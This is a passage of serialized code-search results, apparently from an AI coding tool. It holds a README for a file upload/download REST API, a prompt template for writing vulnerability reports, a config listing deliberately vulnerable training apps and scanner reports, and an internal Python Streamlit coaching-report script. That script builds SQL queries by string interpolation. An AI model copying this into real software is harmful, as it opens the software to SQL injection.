API\\n\\n## Prerequisites\\n\\n- Java 17 or higher\\n- Maven 3.6 or higher\\n\\n## Quick Start\\n\\n### 1. Build the Application\\n\\n\`\`\`bash\\nmvn clean install\\n\`\`\`\\n\\n### 2. Run the Application\\n\\n\`\`\`bash\\nmvn spring-boot:run\\n\`\`\`\\n\\nThe application will start on \`http://localhost:8080\`\\n\\n### 3. Access the Web Interface\\n\\nOpen your browser and navigate to \`http://localhost:8080\` to access the web interface for testing the API.\\n\\n## API Endpoints\\n\\n### Upload File\\n- **URL**: \`POST /api/files/upload\`\\n- **Content-Type**: \`multipart/form-data\`\\n- **Parameter**: \`file\` (the file to upload)\\n- **Response**: JSON with success message and generated filename\\n\\n**Example using curl:**\\n\`\`\`bash\\ncurl -X POST -F \\"file=@/path/to/your/file.txt\\" http://localhost:8080/api/files/upload\\n\`\`\`\\n\\n### Download File\\n- **URL**: \`GET /api/files/download?filename={filename}\`\\n- **Response**: File download with appropriate headers\\n\\n**Example using curl:**\\n\`\`\`bash\\ncurl -O -J \\"http://localhost:8080/api/files/download?filename={filename}\\"\\n\`\`\`\\n\\n### List Files\\n- **URL**: \`GET /api/files/list\`\\n- **Response**: JSON with list of all uploaded files\\n\\n**Example using curl:**\\n\`\`\`bash\\ncurl http://localhost:8080/api/files/list\\n\`\`\`\\n\\n### Delete File\\n- **URL**: \`DELETE /api/files/delete?filename={filename}\`\\n- **Response**: JSON with success message\\n\\n**Example using curl:**\\n\`\`\`bash\\ncurl -X DELETE \\"http://localhost:8080/api/files/delete?filename={filename}\\"\\n\`\`\`\\n\\n### Get File Information\\n- **URL**: \`GET /api/files/info?filename={filename}\`\\n","detailedLines":[{"text":"# File Upload/Download REST API","lineNumber":1},{"lineNumber":2},{"text":"A simple Java REST API built with Spring Boot that allows users to upload files and download them later.","lineNumber":3},{"lineNumber":4},{"text":"## Features","lineNumber":5},{"lineNumber":6},{"text":"- **File Upload**: Upload files with automatic unique filename generation","lineNumber":7},{"text":"- **File Download**: Download files by filename","lineNumber":8},{"text":"- **File Listing**: List all uploaded files","lineNumber":9},{"text":"- **File Deletion**: Delete files by filename","lineNumber":10},{"text":"- **File Information**: Get file metadata (size, last modified)","lineNumber":11},{"text":"- **Web Interface**: Simple HTML interface for testing the API","lineNumber":12},{"lineNumber":13},{"text":"## Prerequisites","lineNumber":14},{"lineNumber":15},{"text":"- Java 17 or higher","lineNumber":16},{"text":"- Maven 3.6 or higher","lineNumber":17},{"lineNumber":18},{"text":"## Quick Start","lineNumber":19},{"lineNumber":20},{"text":"### 1. Build the Application","lineNumber":21},{"lineNumber":22},{"text":"\`\`\`bash","lineNumber":23},{"text":"mvn clean install","lineNumber":24},{"text":"\`\`\`","lineNumber":25},{"lineNumber":26},{"text":"### 2. Run the Application","lineNumber":27},{"lineNumber":28},{"text":"\`\`\`bash","lineNumber":29},{"text":"mvn spring-boot:run","lineNumber":30},{"text":"\`\`\`","lineNumber":31},{"lineNumber":32},{"text":"The application will start on \`http://localhost:8080\`","lineNumber":33},{"lineNumber":34},{"text":"### 3. Access the Web Interface","lineNumber":35},{"lineNumber":36},{"text":"Open your browser and navigate to \`http://localhost:8080\` to access the web interface for testing the API.","lineNumber":37},{"lineNumber":38},{"text":"## API Endpoints","lineNumber":39},{"lineNumber":40},{"text":"### Upload File","lineNumber":41},{"text":"- **URL**: \`POST /api/files/upload\`","lineNumber":42},{"text":"- **Content-Type**: \`multipart/form-data\`","lineNumber":43},{"text":"- **Parameter**: \`file\` (the file to upload)","lineNumber":44},{"text":"- **Response**: JSON with success message and generated filename","lineNumber":45},{"lineNumber":46},{"text":"**Example using curl:**","lineNumber":47},{"text":"\`\`\`bash","lineNumber":48},{"text":"curl -X POST -F \\"file=@/path/to/your/file.txt\\" http://localhost:8080/api/files/upload","lineNumber":49},{"text":"\`\`\`","lineNumber":50},{"lineNumber":51},{"text":"### Download File","lineNumber":52},{"text":"- **URL**: \`GET /api/files/download?filename={filename}\`","lineNumber":53},{"text":"- **Response**: File download with appropriate headers","lineNumber":54},{"lineNumber":55},{"text":"**Example using curl:**","lineNumber":56},{"text":"\`\`\`bash","lineNumber":57},{"text":"curl -O -J \\"http://localhost:8080/api/files/download?filename={filename}\\"","lineNumber":58},{"text":"\`\`\`","lineNumber":59},{"lineNumber":60},{"text":"### List Files","lineNumber":61},{"text":"- **URL**: \`GET /api/files/list\`","lineNumber":62},{"text":"- **Response**: JSON with list of all uploaded files","lineNumber":63},{"lineNumber":64},{"text":"**Example using curl:**","lineNumber":65},{"text":"\`\`\`bash","lineNumber":66},{"text":"curl http://localhost:8080/api/files/list","lineNumber":67},{"text":"\`\`\`","lineNumber":68},{"lineNumber":69},{"text":"### Delete File","lineNumber":70},{"text":"- **URL**: \`DELETE /api/files/delete?filename={filename}\`","lineNumber":71},{"text":"- **Response**: JSON with success message","lineNumber":72},{"lineNumber":73},{"text":"**Example using curl:**","lineNumber":74},{"text":"\`\`\`bash","lineNumber":75},{"text":"curl -X DELETE \\"http://localhost:8080/api/files/delete?filename={filename}\\"","lineNumber":76},{"text":"\`\`\`","lineNumber":77},{"lineNumber":78},{"text":"### Get File Information","lineNumber":79},{"text":"- **URL**: \`GET /api/files/info?filename={filename}\`","lineNumber":80},{"text":"- **Response**: JSON with file metadata (size, last modified)","lineNumber":81}]},"score":0.31596270203590393},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/generator/prompt_files/markdown_system_prompt.txt","range":{"startPosition":{},"endPosition":{"line":44}},"contents":"You are an expert in software security and technical documentation. You are tasked with generating a structured vulnerability.md file for a given software vulnerability. The file must follow the exact markdown format provided below and include all relevant technical details. Ensure your explanations are accurate, examples are syntactically correct, and sections are complete.\\n\\nUse the following format:\\n\`\`\`\\n# {vuln_name}\\n\\n## 1. Vulnerability Description\\n\\n[Describe the vulnerability here]\\n\\n## 2. How It Works\\n\\n[Explain how the vulnerability works]\\n\\n## 3. Vulnerable Code Examples\\n\\n### Example 1\\n\`\`\`{language}\\n// Add vulnerable code example here\\n\`\`\`\\n\\n## 4. Remediation Strategies\\n\\n### Safe Code Examples\\n\`\`\`{language}\\n// Add safe code example here\\n\`\`\`\\n\\n## 5. False Positives Detection\\n\\n### More Safe Code Examples\\n\`\`\`{language}\\n// Add more safe code example here or refer to previous examples\\n\`\`\`\\n\\n## 5. Other Information\\n\\n\\n\\n### Read More\\n\\n* https://example_documentation.com\\n\\n\`\`\`\\n","originalContents":"You are an expert in software security and technical documentation. You are tasked with generating a structured vulnerability.md file for a given software vulnerability. The file must follow the exact markdown format provided below and include all relevant technical details. Ensure your explanations are accurate, examples are syntactically correct, and sections are complete.\\n\\nUse the following format:\\n\`\`\`\\n# {vuln_name}\\n\\n## 1. Vulnerability Description\\n\\n[Describe the vulnerability here]\\n\\n## 2. How It Works\\n\\n[Explain how the vulnerability works]\\n\\n## 3. Vulnerable Code Examples\\n\\n### Example 1\\n\`\`\`{language}\\n// Add vulnerable code example here\\n\`\`\`\\n\\n## 4. Remediation Strategies\\n\\n### Safe Code Examples\\n\`\`\`{language}\\n// Add safe code example here\\n\`\`\`\\n\\n## 5. False Positives Detection\\n\\n### More Safe Code Examples\\n\`\`\`{language}\\n// Add more safe code example here or refer to previous examples\\n\`\`\`\\n\\n## 5. Other Information\\n\\n\\n\\n### Read More\\n\\n* https://example_documentation.com\\n\\n\`\`\`\\n","detailedLines":[{"text":"You are an expert in software security and technical documentation. You are tasked with generating a structured vulnerability.md file for a given software vulnerability. The file must follow the exact markdown format provided below and include all relevant technical details. Ensure your explanations are accurate, examples are syntactically correct, and sections are complete.","lineNumber":1},{"lineNumber":2},{"text":"Use the following format:","lineNumber":3},{"text":"\`\`\`","lineNumber":4},{"text":"# {vuln_name}","lineNumber":5},{"lineNumber":6},{"text":"## 1. Vulnerability Description","lineNumber":7},{"lineNumber":8},{"text":"[Describe the vulnerability here]","lineNumber":9},{"lineNumber":10},{"text":"## 2. How It Works","lineNumber":11},{"lineNumber":12},{"text":"[Explain how the vulnerability works]","lineNumber":13},{"lineNumber":14},{"text":"## 3. Vulnerable Code Examples","lineNumber":15},{"lineNumber":16},{"text":"### Example 1","lineNumber":17},{"text":"\`\`\`{language}","lineNumber":18},{"text":"// Add vulnerable code example here","lineNumber":19},{"text":"\`\`\`","lineNumber":20},{"lineNumber":21},{"text":"## 4. Remediation Strategies","lineNumber":22},{"lineNumber":23},{"text":"### Safe Code Examples","lineNumber":24},{"text":"\`\`\`{language}","lineNumber":25},{"text":"// Add safe code example here","lineNumber":26},{"text":"\`\`\`","lineNumber":27},{"lineNumber":28},{"text":"## 5. False Positives Detection","lineNumber":29},{"lineNumber":30},{"text":"### More Safe Code Examples","lineNumber":31},{"text":"\`\`\`{language}","lineNumber":32},{"text":"// Add more safe code example here or refer to previous examples","lineNumber":33},{"text":"\`\`\`","lineNumber":34},{"lineNumber":35},{"text":"## 5. Other Information","lineNumber":36},{"lineNumber":37},{"lineNumber":38},{"lineNumber":39},{"text":"### Read More","lineNumber":40},{"lineNumber":41},{"text":"* https://example_documentation.com","lineNumber":42},{"lineNumber":43},{"text":"\`\`\`","lineNumber":44}]},"score":0.3146929144859314},{"codeBlock":{"relativeWorkspacePath":"services/node_general_backend/src/maintenance/try_now.ts","range":{"startPosition":{},"endPosition":{"line":55,"column":1}},"contents":"import path from 'node:path'\\n\\nimport {\\n  Projects,\\n  Vendors,\\n} from '../servers/vulnerability_report/vuln_report_generates'\\n\\nconst DATA_DIR = path.join(__dirname, 'try_now')\\n\\nexport const TRY_NOW_PROJECTS = {\\n  [Projects.JuiceShop]: {\\n    url: 'https://github.com/juice-shop/juice-shop',\\n    reference: '9a0789b5ecb4ee76fe528b1860095e945f6302ac',\\n    repoFile: path.join(DATA_DIR, 'juice-shop/repo.zip'),\\n    reportFiles: {\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'juice-shop/checkmarx.json'),\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'juice-shop/codeql.json'),\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'juice-shop/snyk.json'),\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'juice-shop/fortify.fpr'),\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'juice-shop/sonarqube.json'),\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'juice-shop/datadog.json'),\\n    },\\n  },\\n  [Projects.Webgoat]: {\\n    url: 'https://github.com/WebGoat/WebGoat',\\n    reference: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\n    repoFile: path.join(DATA_DIR, 'webgoat/repo.zip'),\\n    reportFiles: {\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'webgoat/checkmarx.json'),\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'webgoat/codeql.json'),\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'webgoat/snyk.json'),\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'webgoat/fortify.fpr'),\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'webgoat/sonarqube.json'),\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'webgoat/datadog.json'),\\n    },\\n  },","originalContents":"import path from 'node:path'\\n\\nimport {\\n  Projects,\\n  Vendors,\\n} from '../servers/vulnerability_report/vuln_report_generates'\\n\\nconst DATA_DIR = path.join(__dirname, 'try_now')\\n\\nexport const TRY_NOW_PROJECTS = {\\n  [Projects.JuiceShop]: {\\n    url: 'https://github.com/juice-shop/juice-shop',\\n    reference: '9a0789b5ecb4ee76fe528b1860095e945f6302ac',\\n    repoFile: path.join(DATA_DIR, 'juice-shop/repo.zip'),\\n    reportFiles: {\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'juice-shop/checkmarx.json'),\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'juice-shop/codeql.json'),\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'juice-shop/snyk.json'),\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'juice-shop/fortify.fpr'),\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'juice-shop/sonarqube.json'),\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'juice-shop/datadog.json'),\\n    },\\n  },\\n  [Projects.Webgoat]: {\\n    url: 'https://github.com/WebGoat/WebGoat',\\n    reference: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\n    repoFile: path.join(DATA_DIR, 'webgoat/repo.zip'),\\n    reportFiles: {\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'webgoat/checkmarx.json'),\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'webgoat/codeql.json'),\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'webgoat/snyk.json'),\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'webgoat/fortify.fpr'),\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'webgoat/sonarqube.json'),\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'webgoat/datadog.json'),\\n    },\\n  },","detailedLines":[{"text":"import path from 'node:path'","lineNumber":1},{"lineNumber":2},{"text":"import {","lineNumber":3},{"text":"  Projects,","lineNumber":4},{"text":"  Vendors,","lineNumber":5},{"text":"} from '../servers/vulnerability_report/vuln_report_generates'","lineNumber":6},{"lineNumber":7},{"text":"const DATA_DIR = path.join(__dirname, 'try_now')","lineNumber":8},{"lineNumber":9},{"text":"export const TRY_NOW_PROJECTS = {","lineNumber":10},{"text":"  [Projects.JuiceShop]: {","lineNumber":11},{"text":"    url: 'https://github.com/juice-shop/juice-shop',","lineNumber":12},{"text":"    reference: '9a0789b5ecb4ee76fe528b1860095e945f6302ac',","lineNumber":13},{"text":"    repoFile: path.join(DATA_DIR, 'juice-shop/repo.zip'),","lineNumber":14},{"text":"    reportFiles: {","lineNumber":15},{"text":"      [Vendors.Checkmarx]: path.join(DATA_DIR, 'juice-shop/checkmarx.json'),","lineNumber":16},{"text":"      [Vendors.CodeQl]: path.join(DATA_DIR, 'juice-shop/codeql.json'),","lineNumber":17},{"text":"      [Vendors.Snyk]: path.join(DATA_DIR, 'juice-shop/snyk.json'),","lineNumber":18},{"text":"      [Vendors.Fortify]: path.join(DATA_DIR, 'juice-shop/fortify.fpr'),","lineNumber":19},{"text":"      [Vendors.SonarQube]: path.join(DATA_DIR, 'juice-shop/sonarqube.json'),","lineNumber":20},{"text":"      [Vendors.Semgrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),","lineNumber":21},{"text":"      [Vendors.Opengrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),","lineNumber":22},{"text":"      [Vendors.Datadog]: path.join(DATA_DIR, 'juice-shop/datadog.json'),","lineNumber":23},{"text":"    },","lineNumber":24},{"text":"  },","lineNumber":25},{"text":"  [Projects.Webgoat]: {","lineNumber":26},{"text":"    url: 'https://github.com/WebGoat/WebGoat',","lineNumber":27},{"text":"    reference: 'c7a41d1b178d006053293699061e0dfdb4f47b99',","lineNumber":28},{"text":"    repoFile: path.join(DATA_DIR, 'webgoat/repo.zip'),","lineNumber":29},{"text":"    reportFiles: {","lineNumber":30},{"text":"      [Vendors.Checkmarx]: path.join(DATA_DIR, 'webgoat/checkmarx.json'),","lineNumber":31},{"text":"      [Vendors.CodeQl]: path.join(DATA_DIR, 'webgoat/codeql.json'),","lineNumber":32},{"text":"      [Vendors.Snyk]: path.join(DATA_DIR, 'webgoat/snyk.json'),","lineNumber":33},{"text":"      [Vendors.Fortify]: path.join(DATA_DIR, 'webgoat/fortify.fpr'),","lineNumber":34},{"text":"      [Vendors.SonarQube]: path.join(DATA_DIR, 'webgoat/sonarqube.json'),","lineNumber":35},{"text":"      [Vendors.Semgrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),","lineNumber":36},{"text":"      [Vendors.Opengrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),","lineNumber":37},{"text":"      [Vendors.Datadog]: path.join(DATA_DIR, 'webgoat/datadog.json'),","lineNumber":38},{"text":"    },","lineNumber":39},{"text":"  },","lineNumber":40},{"text":"  [Projects.Altoroj]: {","lineNumber":41},{"text":"    url: 'https://github.com/HCL-TECH-SOFTWARE/AltoroJ'","lineNumber":42},{"text":",","lineNumber":55},{"text":"}","lineNumber":56}]},"score":0.3024810552597046},{"codeBlock":{"relativeWorkspacePath":"patchino/ai-playground/src/components/mock.ts","range":{"startPosition":{},"endPosition":{"line":362,"column":1}},"contents":"export const mockFile = \`downloadFileimport argparse\\nimport collections\\nimport datetime\\nimport grpc\\nimport itertools\\nimport numpy as np\\nimport os\\nimport pandas as pd\\nimport pandas.io.sql as sqlio\\nimport subprocess\\nimport time\\nimport streamlit as st\\nfrom collections import defaultdict\\nimport plotly.express as px\\n\\nfrom google.protobuf import timestamp_pb2\\n\\nfrom cresta.v1.analytics import analytics_service_pb2\\nfrom cresta.v1.analytics import analytics_service_pb2_grpc\\nfrom cresta.v1.analytics import common_pb2\\nfrom cresta.v1.analytics import qa_stats_pb2\\nfrom cresta.v1.user import user_pb2\\n\\nfrom greyparrot.common import Customer\\nfrom greyparrot.conversations.db import ConversationsDBConn\\n\\nst.write(\\"\\"\\"# Coaching Report #\\"\\"\\")\\n\\nport_forward_ports_and_processes = {\\n    'chat-prod': (8081, None),\\n    'voice-prod': (8082, None),\\n    'us-west-2-prod': (8083, None),\\n}\\n\\nall_customers = [{\\n    'display_name': f'{display_name} ({customer_name})',\\n    'name': customer_name,\\n    'customer_id': customer_id,\\n    'profile_id': profile_id,\\n    'prod_env_name': prod_env_name,\\n    'domain': domain,\\n} for display_name, customer_name, customer_id, profile_id, prod_env_name, domain in sorted(\\n    list(\\n        set((c.pretty_name or c.name.value, c.name.value, c.customer_id, c.profile_id,\\n             c.prod_env_name, c.domain) for c in Customer.all()\\n            if c.prod_env_name in port_forward_ports_and_processes.keys())))]\\n\\ndef build_coaching_plan_url(customer, agent_user_id, coaching_plan_id):\\n    return f\\"{customer['domain']}/director/coaching/workflow/agent/{agent_user_id}/plan/{coaching_plan_id}\\"\\n\\n@st.cache_data\\ndef load_coaching_data(customer_display_name, num_last_days, num_days):\\n    if not customer_display_name:\\n        return None\\n\\n    current_datetime = datetime.datetime.now(datetime.timezone.utc)\\n    first_session_days = current_datetime - datetime.timedelta(days=num_last_days)\\n    last_session_days = current_datetime - datetime.timedelta(days=num_days)\\n\\n    customer = next(c for c in all_customers if c['display_name'] == customer_display_name)\\n\\n    db_conn = ConversationsDBConn.from_customer_name(customer['name'])\\n    conn = db_conn.session.connection().connection\\n\\n    user_id_name = {}\\n    scorecard_template_id_name_map = {}\\n    template_criteria_id_name_map = {}\\n    coaching_sessions = []\\n\\n    with conn.cursor() as cursor:\\n        cursor.execute(f\\"\\"\\"\\n            SELECT\\n                coaching_plans.resource_id as coaching_plan_id,\\n                cu.full_name as creator_user_name,\\n                cu.user_id as creator_user_id,\\n                COALESCE(su.full_name, '') as submitter_user_name,\\n                COALESCE(su.user_id, '') as submitter_user_id,\\n                coaching_sessions.session_at as session_time,\\n                coaching_plans.focus_criteria_ids as focus_behaviors,\\n                au.full_name as agent_user_name,\\n                au.user_id as agent_user_id,\\n                coaching_sessions.resource_id as session_id,\\n                coaching_sessions.usecase_id as usecase\\n            FROM director.coaching_plans \\n                JOIN director.coaching_sessions ON coaching_plans.resource_id = coaching_sessions.coaching_plan_id\\n                JOIN app.users as cu ON coaching_sessions.creator_user_id = cu.user_id\\n                LEFT JOIN app.users as su ON coaching_sessions.manager_submitter_user_id = su.user_id\\n                JOIN app.users as au ON coaching_plans.agent_user_id = au.user_id\\n            WHERE coaching_sessions.manager_submitted_at > '{first_session_days.strftime(\\"%Y-%m-%d\\")}'\\n                AND coaching_sessions.session_at <= '{last_session_days.strftime(\\"%Y-%m-%d\\")}'\\n            \\"\\"\\")\\n        \\n        rows = cursor.fetchall()\\n        for session_note in rows:\\n            if session_note[6] is not None and len(session_note[6]) > 0:\\n                focus_criteria = session_note[6]\\n                for criteria in focus_criteria:\\n                    ids = criteria.split('/')\\n                    scorecard_template_id_name_map[ids[0]] = ''\\n                    coaching_sessions.append({\\n                        \\"session_id\\": session_note[9],\\n                        \\"usecase\\": session_note[10],\\n                        \\"coaching_plan_id\\": session_note[0],\\n                        \\"coaching_plan_url\\": build_coaching_plan_url(customer, session_note[8], session_note[0]),\\n                        \\"creator_user_name\\": session_note[1],\\n                        \\"creator_user_id\\": session_note[2],\\n                        \\"submitter_user_name\\": session_note[3],\\n                        \\"submitter_user_id\\": session_note[4],\\n                        \\"session_time\\": session_note[5],\\n                        \\"focus_criteria_template_id\\": ids[0],\\n                        \\"focus_criteria_id\\": ids[1],\\n                        \\"agent_user_name\\": session_note[7],\\n                        \\"agent_user_id\\": session_note[8],\\n                        \\"before_score\\": -1,\\n                        \\"before_convo_count\\": 0,\\n                        \\"after_score\\": -1,\\n                        \\"after_convo_count\\": 0,\\n                    })\\n            else:\\n                coaching_sessions.append({\\n                    \\"session_id\\": session_note[9],\\n                    \\"coaching_plan_id\\": session_note[0],\\n                    \\"coaching_plan_url\\": build_coaching_plan_url(customer, session_note[8], session_note[0]),\\n                    \\"creator_user_name\\": session_note[1],\\n                    \\"creator_user_id\\": session_note[2],\\n                    \\"submitter_user_name\\": session_note[3],\\n                    \\"submitter_user_id\\": session_note[4],\\n                    \\"session_time\\": session_note[5],\\n                    \\"focus_criteria_template_id\\": '',\\n                    \\"focus_criteria_id\\": '',\\n                    \\"agent_user_name\\": session_note[7],\\n                    \\"agent_user_id\\": session_note[8],\\n                    \\"before_score\\": -1,\\n                    \\"before_convo_count\\": 0,\\n                    \\"after_score\\": -1,\\n                    \\"after_convo_count\\": 0,\\n                })\\n            user_id_name[session_note[2]] = session_note[1]\\n            user_id_name[session_note[4]] = session_note[3]\\n            user_id_name[session_note[8]] = session_note[7]\\n\\n    if len(scorecard_template_id_name_map) == 0:\\n        return coaching_sessions\\n\\n    with conn.cursor() as cursor:\\n        cursor.execute(f\\"\\"\\"\\n            SELECT\\n                resource_id as scorecard_template_id,\\n                title as title,\\n                template as template\\n            FROM director.scorecard_templates \\n            WHERE resource_id IN ('{\\"','\\".join(scorecard_template_id_name_map.keys())}')\\n            \\"\\"\\")\\n        \\n        rows = cursor.fetchall()\\n        for template in rows:\\n            scorecard_template_id_name_map[template[0]] = template[1]\\n            for items in template[2].get('items', []):\\n                if 'identifier' in items and 'displayName' in items:\\n                    template_criteria_id_name_map[items['identifier']] = items['displayName']\\n                if 'items' in items:\\n                    for criteria_items in items['items']:\\n                        if 'identifier' in criteria_items and 'displayName' in criteria_items:\\n                            template_criteria_id_name_map[criteria_items['identifier']] = criteria_items['displayName']\\n\\n        for session in coaching_sessions:\\n            if session['focus_criteria_template_id'] != '':\\n                session['focus_criteria_template'] = scorecard_template_id_name_map[session['focus_criteria_template_id']]\\n            if session['focus_criteria_id'] != '' and session['focus_criteria_id'] in template_criteria_id_name_map:\\n                session['focus_criteria'] = template_criteria_id_name_map[session['focus_criteria_id']]\\n        \\n    return coaching_sessions\\n\\n\\ndef load_scores_data(customer_display_name, coaching_sessions, num_days):\\n    if not coaching_sessions:\\n        return None\\n\\n    customer = next(c for c in all_customers if c['display_name'] == customer_display_name)\\n\\n    progress = st.progress(0, text=\\"Computing the coaching efficiency of the session notes...\\")\\n\\n    port_number, port_forward_process = port_forward_ports_and_processes[customer['prod_env_name']]\\n    if port_forward_process is None or port_forward_process.poll() is not None:\\n        process = subprocess.Popen([\\n            'kubectl',\\n            f'--context={customer[\\"prod_env_name\\"]}',\\n            '--namespace=cresta-api',\\n            'port-forward',\\n            'services/insights-server',\\n            f'{port_number}:80',\\n        ])\\n        port_forward_ports_and_processes[customer['prod_env_name']] = (port_number, process)\\n        time.sleep(2)\\n\\n    api_key = os.environ.get('INSIGHTS_SERVER_API_KEY')\\n    assert api_key, 'INSIGHTS_SERVER_API_KEY must be set'\\n    auth_metadata = [['authorization', f'ApiKey {api_key}']]\\n\\n    with grpc.insecure_channel(\\n            f'localhost:{port_number}',\\n            options=[\\n                ('grpc.max_receive_message_length', 50000000),\\n            ],\\n    ) as channel:\\n        stub = analytics_service_pb2_grpc.AnalyticsServiceStub(channel)\\n        for coaching_session_idx in range(len(coaching_sessions)):\\n            progress.progress(coaching_session_idx / len(coaching_sessions), text=\\"Computing the coaching efficiency of the session notes...\\")\\n            coaching_session = coaching_sessions[coaching_session_idx]\\n            if coaching_session['focus_criteria_id'] != '':\\n                before_score, before_convo_count = query_agent_criteria_score(\\n                    stub, customer, auth_metadata, coaching_session['agent_user_id'], coaching_session['focus_criteria_id'], coaching_session['session_time'] - datetime.timedelta(days=num_days), coaching_session['session_time'])\\n                after_score, after_convo_count = query_agent_criteria_score(\\n                    stub, customer, auth_metadata, coaching_session['agent_user_id'], coaching_session['focus_criteria_id'], coaching_session['session_time'], coaching_session['session_time'] + datetime.timedelta(days=num_days))\\n                coaching_session['before_score'] = before_score\\n                coaching_session['before_convo_count'] = before_convo_count\\n                coaching_session['after_score'] = after_score\\n                coaching_session['after_convo_count'] = after_convo_count\\n\\n    progress.empty()\\n    return coaching_sessions\\n\\n@st.cache_data\\ndef query_agent_criteria_score(_stub, customer, auth_metadata, agent_user_id, criteria_id, start_time, end_time):\\n    parent = f'customers/{customer[\\"customer_id\\"]}/profiles/{customer[\\"profile_id\\"]}'\\n    agent_user_name = f'customers/{customer[\\"customer_id\\"]}/users/{agent_user_id}'\\n    try:\\n        request = analytics_service_pb2.RetrieveQAScoreStatsRequest(\\n            parent=parent,\\n            read_from_clickhouse=True,\\n            filter_by_time_range=common_pb2.TimeRange(\\n                start_timestamp=timestamp_pb2.Timestamp(seconds=int(start_time.timestamp()), ),\\n                end_timestamp=timestamp_pb2.Timestamp(seconds=int(end_time.timestamp()), ),\\n            ),\\n            filter_by_attribute=qa_stats_pb2.QAAttribute(\\n                    users=[user_pb2.User(name=agent_user_name)],\\n                    criterion_identifiers=[criteria_id],\\n                ),\\n            group_by_attribute_types=[\\n                qa_stats_pb2.QAAttributeType.QA_ATTRIBUTE_TYPE_CRITERION,\\n            ],\\n        )\\n        response = _stub.RetrieveQAScoreStats(\\n            request,\\n            metadata=auth_metadata,\\n            timeout=600)\\n    except Exception as e:\\n        print(f'Error querying Insights Server: {e}')\\n        return None\\n    if response.qa_score_result.total_conversation_count == 0:\\n        return -1, 0\\n    return response.qa_score_result.average_qa_score, response.qa_score_result.total_conversation_count\\n\\n\\n##############################################################################################\\n\\ncustomer_display_name = st.selectbox(\\n    'Select a customer:',\\n    [c['display_name'] for c in all_customers])\\n\\nnum_last_days = st.number_input(\\"How many days back to load the session notes?\\", min_value=7, max_value=180, value=30, step=1)\\n\\nnum_days = st.number_input(\\"How many days to measure the session efficiency?\\", min_value=1, max_value=30, value=7, step=1)\\n\\ncoaching_sessions = load_coaching_data(customer_display_name, num_last_days, num_days)\\n\\ncoaching_sessions = load_scores_data(customer_display_name, coaching_sessions, num_days)\\n\\nwith st.expander(\\"All loaded session notes\\", expanded=True):\\n    st.write(f\\"Loaded {len(coaching_sessions)} coaching sessions in total\\")\\n    session_df = pd.DataFrame(coaching_sessions)\\n    st.dataframe(session_df)\\n    st.write(f\\"Loaded {len(session_df['session_id'].unique())} coaching sessions in { len(session_df['coaching_plan_id'].unique()) } coaching plans.\\")\\n    # session_df.to_csv('coaching_sessions.csv', index=False)  # Set index=False to omit row numbers\\n\\nwith st.expander(\\"Session notes with valid scores\\", expanded=True):\\n    # Coach efficiency chart.\\n    valid_session_df = session_df[(session_df['before_score'] >= 0) & (session_df['after_score'] >= 0)].reset_index()\\n    st.dataframe(valid_session_df)\\n \\n    session_with_criteria_df = session_df[session_df['focus_criteria_id'] != '']\\n    st.write(f\\"Loaded {len(session_with_criteria_df['session_id'].unique())} coaching sessions with focus criteria in the coaching plan.\\")\\n    st.write(f\\"Loaded {len(valid_session_df['session_id'].unique())} coaching sessions with valid performance scores computed.\\")\\n\\ndef weighted_effiency(df):\\n    efficiency = ((df['after_score'] - df['before_score']) * df['after_convo_count']).sum() / df['after_convo_count'].sum()\\n    num_sessions =  len(df['session_id'].unique())\\n    return pd.Series({\\n        'efficiency': efficiency,\\n        'num_sessions': num_sessions\\n    })\\n\\nwith st.expander(\\"Session efficiency\\", expanded=True):\\n    session_efficiency_df = valid_session_df.groupby('session_id').apply(weighted_effiency).reset_index()\\n    session_efficiency_df.columns = ['Session id', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(session_efficiency_df)\\n    fig = px.histogram(session_efficiency_df, x=\\"Efficiency\\", nbins=100)\\n    st.plotly_chart(fig, theme=\\"streamlit\\")\\n\\nwith st.expander(\\"Coaching plan efficiency\\", expanded=True):\\n    plan_efficiency_df = valid_session_df.groupby('coaching_plan_id').apply(weighted_effiency).reset_index()\\n    plan_efficiency_df.columns = ['Coach Plan', 'Efficiency', 'Number of Sessions']\\n    st.dataframe(plan_efficiency_df)\\n    fig = px.histogram(plan_efficiency_df, x=\\"Efficiency\\", nbins=100)\\n    st.plotly_chart(fig, 